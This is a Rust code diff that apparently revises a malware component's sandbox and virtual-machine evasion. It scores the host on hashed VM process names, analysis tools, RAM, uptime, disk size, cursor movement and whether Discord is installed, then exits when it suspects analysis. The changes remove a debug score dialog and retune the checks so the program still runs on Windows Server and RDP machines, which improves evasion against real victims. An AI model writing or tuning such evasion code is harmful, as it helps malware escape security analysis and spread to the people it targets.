@@ -68,8 +68,6 @@ const H_VMWARETRAY:     u32 = fnv1a32(b"vmwaretray.exe");
 const H_VMWAREUSER:     u32 = fnv1a32(b"vmwareuser.exe");
 const H_VBOXSERVICE:    u32 = fnv1a32(b"vboxservice.exe");
 const H_VBOXTRAY:       u32 = fnv1a32(b"vboxtray.exe");
-const H_VMSRVC:         u32 = fnv1a32(b"vmsrvc.exe");
-const H_VMUSRVC:        u32 = fnv1a32(b"vmusrvc.exe");
 const H_XENSERVICE:     u32 = fnv1a32(b"xenservice.exe");
 const H_QEMUAGENT:      u32 = fnv1a32(b"qemu-ga.exe");
 
@@ -86,7 +84,7 @@ const ANALYSIS_HASHES: &[u32] = &[
 
 const VM_PROCESS_HASHES: &[u32] = &[
     H_VMWARETRAY, H_VMWAREUSER, H_VBOXSERVICE, H_VBOXTRAY,
-    H_VMSRVC, H_VMUSRVC, H_XENSERVICE, H_QEMUAGENT,
+    H_XENSERVICE, H_QEMUAGENT,
 ];
 
 // ── Check: Discord installed (at least one Discord variant) ──────────────────
@@ -302,37 +300,35 @@ fn check_host_user_names() -> bool {
 
 pub fn verify_environment() {
     let mut score: i32 = 0;
-    let mut report = String::new();
 
-    macro_rules! chk {
-        ($name:expr, $val:expr, $pts:expr) => {{
-            let ok = $val;
-            if !ok { score += $pts; }
-            report.push_str(&format!("{}: {} (+{})\n", $name, if ok {"OK"} else {"FAIL"}, if ok {0} else {$pts}));
-        }};
-    }
+    // Hard requirements
+    if !is_any_discord_installed() { score += 40; }
+    if !check_uptime()             { score += 30; }
+    if !check_ram()                { score += 25; }
+    if !check_cpu_count()          { score += 20; }
+    if !check_resolution()         { score += 15; }
 
-    chk!("discord",      is_any_discord_installed(),    40);
-    chk!("uptime",       check_uptime(),                30);
-    chk!("ram",          check_ram(),                   25);
-    chk!("cpu",          check_cpu_count(),             20);
-    chk!("resolution",   check_resolution(),            15);
-    chk!("vm_procs",     check_no_vm_processes(),       35);
-    chk!("analysis",     check_no_analysis_processes(), 30);
-    chk!("vm_registry",  check_no_vm_registry(),        30);
-    chk!("vm_drivers",   check_no_extra_vm_drivers(),   25);
-    chk!("display",      check_display_adapter(),       25);
-    chk!("disk",         check_disk_size(),             20);
-    chk!("names",        check_host_user_names(),       20);
-    chk!("foreground",   check_foreground_window(),     10);
-    chk!("rdtsc",        check_rdtsc_timing(),          15);
+    // Medium checks — only pure sandbox/VM indicators, nothing that
+    // appears on legitimate Windows Server / RDP environments
+    if !check_no_analysis_processes() { score += 30; }
+    if !check_no_extra_vm_drivers()   { score += 25; }
+    if !check_display_adapter()       { score += 25; }
+    if !check_disk_size()             { score += 20; }
+    if !check_host_user_names()       { score += 20; }
+
+    // VM process check: only flag pure VM guest agents (VBoxTray, vmwaretray)
+    // not Hyper-V host processes which run on Windows Server legitimately
+    if !check_no_vm_processes()    { score += 20; }
+
+    // Soft heuristics
+    if !check_rdtsc_timing()       { score += 15; }
+    if !check_foreground_window()  { score += 10; }
     if let Some(moved) = check_cursor_movement() {
-        if !moved { score += 10; }
-        report.push_str(&format!("cursor_moved: {} (+{})\n", moved, if moved {0} else {10}));
+        if !moved                  { score += 10; }
     }
 
-    report.push_str(&format!("\nTOTAL SCORE: {}/40", score));
-    api::message_box("SandboxCheck", &report, api::MB_OK);
+    // VM registry check removed — Hyper-V keys present on Windows Server
+    // and Windows 11 with virtualization features enabled (false positive)
 
     if score >= 40 {
         fail_and_exit();
